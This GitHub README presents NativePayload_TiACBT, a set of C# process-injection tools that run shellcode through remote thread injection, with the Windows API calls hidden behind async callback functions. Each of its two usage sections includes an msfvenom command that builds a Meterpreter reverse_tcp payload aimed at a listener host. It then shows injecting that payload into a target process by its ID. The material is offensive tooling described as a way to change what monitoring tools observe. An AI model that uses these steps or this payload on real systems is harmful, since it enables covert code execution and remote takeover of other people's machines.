# NativePayload_TiACBT
NativePayload_CallBackTechniques C# Codes (Code Execution via Callback Functions, without CreateThread Native API)<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FDamonMohammadbgher%2FNativePayload_TiACBT"/></a></p>
-------------
Note: These C# Codes Tested by .Net Framework 3.5 or 4.0 & 4.5 only ;) & i will Publish Article for these codes soon , in these code we have Remote Thread Injection + Calling Async C# Methods + Callback Functions Technique CBT, in these Codes We have "CreateRemmoteThread or NtCreateThreadEx" BUT the goal is Changing Code Behaviour for Calling API Finction (Remote Thread Injection only), as you can see in the Pictures With API onitor tools you can see what happened step by step. (i (i will publish article about this Codes soon...)  

--------------------------------------------
C# Codes: "New C# codes for Callback Functions will publish here soon..."
```diff
+    1. NativePayload_TiACBT.cs
+    2. NativePayload_TiACBT2.cs
```

--------------------------------------------

1. NativePayload_TiACBT.cs (Remote Thread Injection + Calling Async C# Methods + Callback Functions Technique via EnumUILanguagesA + EnumSystemLocalesA Native APIs)

 Note: NativePayload_TiACBT will call APIs: OpenProcess,VirtualAllocEx,WriteProcessMemory,CreateRemoteThread (all methods called via Async C# Method + Callback Functions ...)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_TiACBT.exe [mode 1,2] [TPID] [PAYLOAD]
    example: NativePayload_TiACBT.exe 1 5930 "fc,48,00,87,00,...."
    example: NativePayload_TiACBT.exe 2 5930 "fc,48,00,87,00,...."
    

   ![](https://github.com/DamonMohammadbagher/NativePayload_TiACBT/blob/main/Pics/NativePayload_TiACBT.png)

 -----------------------------------------------------------    
2. NativePayload_TiACBT2.cs (Remote Thread Injection + Calling Async C# Methods + Callback Functions Technique via EnumUILanguagesA Native API)

 Note: NativePayload_TiACBT2 will call APIs: OpenProcess,VirtualAllocEx,WriteProcessMemory,NtCreateThreadEx
 
 Note: in this code Method1 (OpenProcess) will call Method2 (VirtualAllocEx) & Method2 Will Call Method3 (WriteProcessMemory) & Method3 Will call Method4 (NtCreateThreadEx) and all methods called via Async C# Method + Callback Functions ...

 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_TiACBT2.exe   [TPID] [PAYLOAD]
    example: NativePayload_TiACBT2.exe  4386 "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_TiACBT/blob/main/Pics/NativePayload_TiACBT2.png)

 --------------------------------------------    
